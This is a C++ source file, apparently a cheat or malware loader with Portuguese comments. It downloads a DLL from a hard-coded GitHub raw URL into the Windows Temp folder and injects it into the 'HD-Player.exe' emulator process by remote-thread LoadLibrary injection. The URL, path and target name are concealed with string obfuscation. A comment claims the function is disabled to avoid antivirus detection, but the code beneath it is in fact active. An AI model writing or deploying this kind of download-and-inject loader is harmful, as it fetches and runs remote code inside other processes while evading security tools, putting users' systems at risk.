// inject.cpp

#include <windows.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <fstream>
#include "stranch.h"

#pragma comment(lib, "wininet.lib")

DWORD GetProcessIdByName(const std::wstring& processName) {
    PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return 0;

    DWORD pid = 0;
    if (Process32First(snapshot, &entry)) {
        do {
            if (!_wcsicmp(entry.szExeFile, processName.c_str())) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pid;
}

bool DownloadFile(const std::string& url, const std::string& filePath) {
    HINTERNET hInternet = InternetOpen(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return false;
    }

    std::ofstream outFile(filePath, std::ios::binary);
    if (!outFile.is_open()) {
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        outFile.write(buffer, bytesRead);
    }

    outFile.close();
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    return true;
}

bool InjectWithLoadLibrary(const std::wstring& processName, const std::string& dllPath) {
    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) {
        MessageBox(NULL, L"Emulador fechado!!", L"Erro", MB_OK | MB_ICONERROR);
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        MessageBox(NULL, L"Emulador fechado!!", L"Erro", MB_OK | MB_ICONERROR);
        return false;
    }

    LPVOID alloc = VirtualAllocEx(hProcess, NULL, dllPath.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!alloc) {
        MessageBox(NULL, L"3", L"Erro", MB_OK | MB_ICONERROR);
        CloseHandle(hProcess);
        return false;
    }

    WriteProcessMemory(hProcess, alloc, dllPath.c_str(), dllPath.size() + 1, NULL);

    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"),
        alloc,
        0,
        NULL
    );

    if (!hThread) {
        MessageBox(NULL, L"2", L"Erro", MB_OK | MB_ICONERROR);
        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return true;
}

void InjectDLLFromWeb() {
    // FUNÇÃO TEMPORARIAMENTE DESABILITADA PARA EVITAR DETECÇÃO DE ANTIVÍRUS
    // Esta função baixa e injeta DLL, o que é detectado como comportamento suspeito
    
    //MessageBox(NULL, L"Função de injeção desabilitada temporariamente", L"Aviso", MB_OK | MB_ICONINFORMATION);
    
    //CÓDIGO ORIGINAL COMENTADO:
    std::string url = std::string((const char*)AY_OBFUSCATE("https://github.com/mateus978/pedrin12098371203/raw/refs/heads/main/Runtime.dll"));
    std::string tempPath = std::string((const char*)AY_OBFUSCATE("C:\\Windows\\Temp\\Runtime.dll"));
    std::wstring targetProcess = (wchar_t*)AY_OBFUSCATE(L"HD-Player.exe");

    if (!DownloadFile(url, tempPath)) {
        MessageBox(NULL, L"1", L"Erro", MB_OK | MB_ICONERROR);
        return;
    }

    InjectWithLoadLibrary(targetProcess, tempPath);

    ExitProcess(0);
    
}
